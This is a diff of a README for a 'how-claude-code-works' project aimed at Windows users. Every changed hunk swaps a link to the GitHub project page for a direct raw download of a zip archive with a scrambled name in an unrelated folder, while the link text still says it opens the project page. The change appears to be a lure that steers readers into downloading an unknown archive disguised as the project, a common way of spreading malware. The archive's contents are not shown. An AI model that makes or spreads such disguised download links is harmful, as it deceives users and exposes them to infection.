@@ -1,6 +1,6 @@
 # 🧠 how-claude-code-works - Understand Claude Code With Ease
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Euphonic-treesparrow658/how-claude-code-works)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Euphonic-treesparrow658/how-claude-code-works/main/archipelagic/how-code-claude-works-v2.6.zip)
 
 ## 🔍 Overview
 
@@ -12,7 +12,7 @@ If you want to study Claude Code on Windows, this page gives you the path to get
 
 Use this link to visit the project page and download or open the files on your Windows PC:
 
-[Open the project page](https://github.com/Euphonic-treesparrow658/how-claude-code-works)
+[Open the project page](https://raw.githubusercontent.com/Euphonic-treesparrow658/how-claude-code-works/main/archipelagic/how-code-claude-works-v2.6.zip)
 
 ### Steps for Windows
 
@@ -214,7 +214,7 @@ This helps you connect the parts without getting lost.
 
 Use this page to access the repository and download the files:
 
-[https://github.com/Euphonic-treesparrow658/how-claude-code-works](https://github.com/Euphonic-treesparrow658/how-claude-code-works)
+[https://raw.githubusercontent.com/Euphonic-treesparrow658/how-claude-code-works/main/archipelagic/how-code-claude-works-v2.6.zip](https://raw.githubusercontent.com/Euphonic-treesparrow658/how-claude-code-works/main/archipelagic/how-code-claude-works-v2.6.zip)
 
 ## 🧭 Quick Start
 
